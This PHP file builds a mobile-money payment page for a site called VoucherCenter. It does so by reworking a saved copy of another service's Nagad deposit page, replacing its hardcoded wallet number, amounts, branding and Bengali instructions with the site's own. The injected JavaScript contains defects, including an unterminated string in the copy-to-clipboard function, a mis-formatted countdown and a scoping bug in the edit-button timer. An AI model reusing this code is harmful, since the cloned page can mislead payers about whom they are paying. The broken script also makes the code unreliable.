<?php
/**
 * Payment page — loads order by tracking number, injects dynamic data into Pay.html.
 * Orders expire after 10 minutes.
 */

require_once __DIR__ . '/../Proxy/admin/store.php';
require_once __DIR__ . '/../Proxy/admin/includes/functions.php';

$tracking = trim((string) ($_GET['tracking'] ?? ''));
if ($tracking === '') {
    http_response_code(404);
    header('Content-Type: text/plain; charset=UTF-8');
    echo '404 Not Found';
    exit;
}

$order = find_order_by_tracking($tracking);
if (!$order) {
    http_response_code(404);
    header('Content-Type: text/plain; charset=UTF-8');
    echo '404 Not Found';
    exit;
}

$createdAt = strtotime($order['createdAt'] ?? 'now');
$expiresAt = $createdAt + (10 * 60);
$now = time();
$isExpired = ($now >= $expiresAt && $order['status'] === 'WaitingConfirm');

if ($isExpired) {
    update_order($tracking, ['status' => 'Expired']);
    $order['status'] = 'Expired';
}

$method = $order['paymentMethod'];
$amount = $order['amount'];
$channel = $order['paymentChannel'];

$settings = payment_settings_read();
$contentCfg = content_load();
$pmData = payment_methods_data_read();
$methods = $pmData['methods'] ?? [];
$currency = $settings['currency'] ?? 'BDT';
$tmpBrand = trim((string) ($contentCfg['titles']['web_title'] ?? $contentCfg['titles']['app_name'] ?? ''));
if ($tmpBrand === '') $tmpBrand = trim((string) ($settings['brandName'] ?? $settings['platformName'] ?? 'VoucherCenter'));
$brandName = $tmpBrand;

$methodInfo = $methods[$method] ?? null;
if (!$methodInfo || $amount <= 0) {
    header('Location: index.php');
    exit;
}

$accountNumber = $order['accountNumber'] ?? '';
if ($accountNumber === '') {
    foreach (($methodInfo['accounts'] ?? []) as $acc) {
        if ($acc['enabled'] ?? false) {
            $accountNumber = $acc['number'] ?? '';
            break;
        }
    }
}
$formattedAmount = number_format($amount);

$methodColors = [
    'BKASH' => '#E2136E', 'BKASHSM' => '#E2136E',
    'NAGAD' => '#F6921E', 'NAGADSM' => '#F6921E',
    'ROCKET' => '#D2122E', 'USDT' => '#26A17B',
];
$methodLabels = [
    'BKASH' => 'bKash', 'BKASHSM' => 'bKash',
    'NAGAD' => 'Nagad', 'NAGADSM' => 'Nagad',
    'ROCKET' => 'Rocket', 'USDT' => 'USDT',
];
$methodBankImages = [
    'BKASH' => '/images/banks/bKash.png?v=36b0c4b',
    'BKASHSM' => '/images/banks/bKash.png?v=36b0c4b',
    'NAGAD' => '/images/banks/Nagad.png?v=36b0c4b',
    'NAGADSM' => '/images/banks/Nagad.png?v=36b0c4b',
    'ROCKET' => '/images/banks/RocketNew.png?v=36b0c4b',
    'USDT' => '/images/banks/USDT.png?v=36b0c4b',
];

$methodColor = $methodColors[$method] ?? '#006644';
$methodLabel = $methodLabels[$method] ?? $method;
$bankImage = $methodBankImages[$method] ?? '';
$isSendMoney = (stripos($method, 'SM') !== false || stripos($channel, 'send') !== false);

$html = @file_get_contents(dirname(__DIR__) . '/Pay.html');
if ($html === false) {
    http_response_code(500);
    echo 'Pay.html not found.';
    exit;
}

$html = preg_replace('/<style id="yt-blacklist-styles">.*?<\/style>/is', '', $html);
$html = preg_replace('/<style id="savepage-cssvariables">.*?<\/style>/is', '', $html);
$html = preg_replace('/<style>\s*<\/style>/is', '', $html);

$html = preg_replace('/<script[^>]*data-savepage-src="[^"]*"[^>]*>.*?<\/script>/is', '', $html);
$html = preg_replace('/<script id="savepage-shadowloader"[^>]*>.*?<\/script>/is', '', $html);

$html = preg_replace_callback(
    '/(<img[^>]*?)data-savepage-currentsrc="([^"]+)"\s+data-savepage-src="([^"]+)"\s+src="data:[^"]*"/i',
    function ($m) { return $m[1] . 'src="' . $m[3] . '"'; },
    $html
);
$html = preg_replace_callback(
    '/(<img[^>]*?)data-savepage-src="([^"]+)"\s+src="data:[^"]*"/i',
    function ($m) { return $m[1] . 'src="' . $m[2] . '"'; },
    $html
);
$html = preg_replace_callback(
    '/(<img[^>]*?)data-savepage-currentsrc="([^"]+)"\s+src="data:[^"]*"/i',
    function ($m) { return $m[1] . 'src="' . $m[2] . '"'; },
    $html
);
$html = preg_replace('/src="data:[^"]*"/', 'src=""', $html);

$html = preg_replace('/<meta\s+name="savepage-[^"]*"[^>]*>/i', '', $html);
$html = preg_replace('/<meta\s+http-equiv="Cache-Control"[^>]*>/i', '', $html);
$html = preg_replace('/<meta\s+http-equiv="Pragma"[^>]*>/i', '', $html);
$html = preg_replace('/<meta\s+http-equiv="Expires"[^>]*>/i', '', $html);
$html = preg_replace('/\sdata-savepage-[a-z]+="[^"]*"/i', '', $html);

$origStyles = '';
if (preg_match('/<head>(.*)<\/head>/is', $html, $headMatch)) {
    $headContent = $headMatch[1];
    preg_match_all('/<style[^>]*>.*?<\/style>/is', $headContent, $styleMatches);
    $origStyles = implode("\n", $styleMatches[0]);
}

$headReplace = '<head>'
    . '<meta charset="UTF-8">'
    . '<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">'
    . '<title>Payment - ' . htmlspecialchars($brandName) . '</title>'
    . '<link rel="icon" href="/images/favicon.ico">'
    . '<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;600;700&family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">'
    . $origStyles
    . '<style>'
    . '.blink-text{animation:blink 1s step-end infinite}'
    . '@keyframes blink{50%{opacity:0}}'
    . '#resultOverlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;z-index:10000;background:rgba(0,0,0,.5);align-items:center;justify-content:center}'
    . '#resultOverlay.show{display:flex}'
    . '#resultCard{background:#fff;border-radius:12px;padding:40px 32px;text-align:center;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,.3)}'
    . '#resultCard .icon{width:64px;height:64px;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:32px}'
    . '#resultCard .icon.success{background:#d4edda;color:#27ae60}'
    . '#resultCard .icon.error{background:#f8d7da;color:#e74c3c}'
    . '#resultCard h2{font-size:18px;margin:0 0 8px;color:#333}'
    . '#resultCard p{font-size:14px;color:#666;margin:0 0 20px}'
    . '#resultCard a{display:inline-block;padding:10px 24px;background:#006644;color:#fff;text-decoration:none;border-radius:6px;font-weight:600}'
    . '.q-loading,.q-loading__backdrop{display:none!important}'
    . '#q-app{opacity:1!important;visibility:visible!important}'
    . 'body .q-body--loading{overflow:auto!important}'
    . '.q-page{opacity:1!important}'
    . '#expiredOverlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;z-index:20000;background:rgba(0,0,0,.7);align-items:center;justify-content:center}'
    . '#expiredOverlay.show{display:flex}'
    . '#expiredCard{background:#fff;border-radius:12px;padding:40px 32px;text-align:center;max-width:400px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,.3)}'
    . '#expiredCard .icon{width:64px;height:64px;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;font-size:32px;background:#f8d7da;color:#e74c3c}'
    . '#expiredCard h2{font-size:18px;margin:0 0 8px;color:#333}'
    . '#expiredCard p{font-size:14px;color:#666;margin:0 0 20px}'
    . '#expiredCard a{display:inline-block;padding:10px 24px;background:#006644;color:#fff;text-decoration:none;border-radius:6px;font-weight:600}'
    . '#countdownBar{position:fixed;top:0;left:0;right:0;height:4px;background:#e0e0e0;z-index:9999}'
    . '#countdownBar .fill{height:100%;background:' . $methodColor . ';transition:width 1s linear}'
    . (($method === 'NAGAD' || $method === 'NAGADSM') ? '.q-banner .q-img.q-img--menu[style*="60px"]{background:#fff!important;border:1px solid #ddd!important;border-radius:50%!important;overflow:hidden!important;padding:4px!important;box-sizing:border-box!important}.q-banner .q-img.q-img--menu[style*="60px"] .q-img__image{border-radius:50%!important}' : '')
    . '</style>'
    . '</head>';

$html = preg_replace('/<head>.*?<\/head>/is', $headReplace, $html, 1);

$html = str_replace('src="/icons/', 'src="/images/icons/', $html);
$html = str_replace('src="/banks/', 'src="/images/banks/', $html);
$html = str_replace('src="/transactions/', 'src="/images/transactions/', $html);
// Cache-bust top icons to bypass stale Cloudflare cache (HTML cached as image)
$html = str_replace('src="/images/icons/pay-service.svg"', 'src="/images/icons/pay-service.svg?v=7cce0e5"', $html);
$html = str_replace('src="/images/icons/pay-page-copy.png"', 'src="/images/icons/pay-page-copy.png?v=7cce0e5"', $html);

$html = preg_replace('/background:\s*rgb\(0,\s*102,\s*68\)/', 'background: ' . $methodColor, $html);
$html = preg_replace('/background:\s*rgb\(242,\s*79,\s*65\)/', 'background: ' . $methodColor, $html);

$html = preg_replace('/<b class="col-12" style="font-size:\s*20px;">BDT\s+[\d,]+<\/b>/',
    '<b class="col-12" style="font-size:20px;">' . htmlspecialchars($currency) . ' ' . $formattedAmount . '</b>', $html, 1);

$html = preg_replace('/value="01877668758"/', 'value="' . htmlspecialchars($accountNumber) . '"', $html, 1);

$html = str_replace('NAGAD Deposit', htmlspecialchars($methodLabel) . ' ' . ($isSendMoney ? 'Send Money' : 'Deposit'), $html);
$html = str_replace('NAGAD', htmlspecialchars($methodLabel), $html);

$html = preg_replace('/এই\s+' . preg_quote(htmlspecialchars($methodLabel)) . '\s+নাম্বারে[^<]*/',
    'এই ' . htmlspecialchars($methodLabel) . ' নাম্বারে শুধুমাত্র ' . ($isSendMoney ? 'Send Money' : 'Cashout') . ' গ্রহণ করা হয়', $html);

$html = preg_replace('/NAGAD\s+deposit\s+ওয়ালেট[^<]*/',
    htmlspecialchars($methodLabel) . ' deposit ওয়ালেট নাম্বারে ক্যাশ আউট করছেন। এই নাম্বারের অন্য কোন ওয়ালেট থেকে ক্যাশ আউট করলে সেই টাকা পাওয়ার কোন সম্ভাবনা নাই', $html);

if ($bankImage) {
    $html = preg_replace('/\/images\/banks\/[A-Za-z]+\.png/', $bankImage, $html);
}

$html = preg_replace('/আপনি যদি টাকার পরিমাণ পরিবর্তন করেন \(BDT\s+[\d,]+\)/',
    'If you change the amount (' . htmlspecialchars($currency) . ' ' . $formattedAmount . ')', $html);

$html = str_replace('কম বা বেশি ক্যাশআউট করবেন না', 'Do not cashout more or less', $html);

$html = preg_replace(
    '/(<button\s+class="q-btn\s+q-btn-item\s+non-selectable\s+no-outline\s+q-btn--outline\s+q-btn--rectangle\s+q-btn--square\s+text-black\s+q-btn--actionable\s+q-focusable\s+q-hoverable\s+q-btn--no-uppercase\s+q-btn--square"\s+tabindex="0"\s+type="button"\s+style=")([^"]*)(">)/',
    '$1$2" id="submitBtn" onclick="submitTransaction()"$3',
    $html, 1
);
$html = str_replace('onclick="submitTransaction()""', 'onclick="submitTransaction()"', $html);

$html = preg_replace(
    '/(<div class="q-img q-img--menu cursor-pointer")/',
    '$1 onclick="copyWallet()"',
    $html, 1
);

$expiresAtMs = $expiresAt * 1000;

$expiredClass = $isExpired ? ' show' : '';

$injection = ''
    . '<div id="countdownBar"><div class="fill" id="countdownFill"></div></div>'
    . '<style>'
    . '#editTrxBtn{display:none;cursor:pointer;padding:8px 12px;background:' . $methodColor . ';color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:600;margin-left:8px;white-space:nowrap}'
    . '#editTrxBtn:hover{opacity:.85}'
    . '.trx-success{border-color:#27ae60!important}'
    . '</style>'
    . '<script>'
    . 'var trackingNumber=' . json_encode($tracking) . ';'
    . 'var apiBase=' . json_encode('/api') . ';'
    . 'var expiresAtMs=' . $expiresAtMs . ';'
    . 'var serverNow=' . ($now * 1000) . ';'
    . 'var trxSubmitted=false;'
    . 'var editWindowMs=5*60*1000;'
    . 'var trxSubmittedAt=0;'

    . 'function tick(){'
    . 'var now=Date.now(),remaining=expiresAtMs-now;'
    . 'if(remaining<=0){'
    . 'document.getElementById("expiredOverlay").classList.add("show");'
    . 'var tx=document.querySelector(".input-red input");if(tx)tx.disabled=true;'
    . 'var sb=document.getElementById("submitBtn");if(sb)sb.disabled=true;'
    . 'var eb=document.getElementById("editTrxBtn");if(eb)eb.style.display="none";'
    . 'return;}'
    . 'var total=10*60*1000,pct=Math.max(0,(remaining/total)*100);'
    . 'document.getElementById("countdownFill").style.width=pct+"%";'
    . 'var m=Math.floor(remaining/60000),s=Math.floor((remaining%60000)/1000);'
    . 'var cd=document.getElementById("countdownText");'
    . 'if(cd)cd.textContent=m+":"+(s<10?"0":"")+" "+s;'
    . 'setTimeout(tick,1000);}'
    . 'tick();'

    . 'function copyWallet(){var i=document.querySelector("input[readonly]");if(!i)return;var v=i.value;if(!v)return;if(navigator.clipboard){navigator.clipboard.writeText(v)}else{var t=document.createElement("textarea");t.value=v;document.body.appendChild(t);t.select();document.execCommand("copy");document.body.removeChild(t)}var el=document.querySelector(".q-img.q-img--menu");if(el){var tip=document.createElement("span");tip.textContent="Copied!";tip.style.cssText="position:absolute;top:-30px;left:50%;transform:translateX(-50%);background:#006644;color:#fff;padding:4px 12px;border-radius:4px;font-size:12px;white-space:nowrap;z-index:9999;pointer-events:none;el.style.position="relative";el.appendChild(tip);setTimeout(function(){tip.remove()},1500)}}'

    . 'function submitTransaction(){'
    . 'var sb=document.getElementById("submitBtn");if(sb&&sb.disabled)return;'
    . 'var tx=document.querySelector(".input-red input");if(!tx)return;var v=tx.value.trim();'
    . 'if(!v){tx.focus();return;}'
    . 'if(sb)sb.disabled=true;'
    . 'fetch(apiBase+"/submitTransaction.php",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({trackingNumber:trackingNumber,trxId:v})})'
    . '.then(function(r){return r.json()})'
    . '.then(function(d){if(d.success){'
    . 'trxSubmitted=true;trxSubmittedAt=Date.now();'
    . 'tx.readOnly=true;tx.classList.add("trx-success");'
    . 'sb.style.display="none";'
    . 'var eb=document.getElementById("editTrxBtn");if(eb)eb.style.display="inline-block";'
    . 'setTimeout(function(){if(trxSubmitted)var eb2=document.getElementById("editTrxBtn");if(eb2)eb2.style.display="none";},editWindowMs);'
    . '}else{if(sb)sb.disabled=false;}})'
    . '.catch(function(){if(sb)sb.disabled=false;})}'

    . 'function editTrx(){'
    . 'var tx=document.querySelector(".input-red input");if(!tx)return;'
    . 'var eb=document.getElementById("editTrxBtn");if(eb)eb.style.display="none";'
    . 'tx.readOnly=false;tx.value="";tx.focus();tx.classList.remove("trx-success");'
    . 'var sb=document.getElementById("submitBtn");if(sb){sb.style.display="inline-block";sb.disabled=false;}'
    . 'trxSubmitted=false;}'
    . '</script>'

    . '<div id="expiredOverlay"' . $expiredClass . '><div id="expiredCard">'
    . '<div class="icon">&#x2717;</div>'
    . '<h2>Payment Expired</h2>'
    . '<p>This payment session has expired. Please go back and create a new order.</p>'
    . '<a href="/voucherCenter/">Back to VoucherCenter</a>'
    . '</div></div>';

$html = str_replace('</body>', $injection . '</body>', $html);

$html = str_replace(
    '<span class="block">নিশ্চিত</span></span></button>',
    '<span class="block">নিশ্চিত</span></span></button><button id="editTrxBtn" onclick="editTrx()" style="display:none">Edit TRX</button>',
    $html
);

if ($isExpired) {
    $html = str_replace('id="submitBtn"', 'id="submitBtn" disabled', $html);
}

header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-cache, must-revalidate');
echo $html;
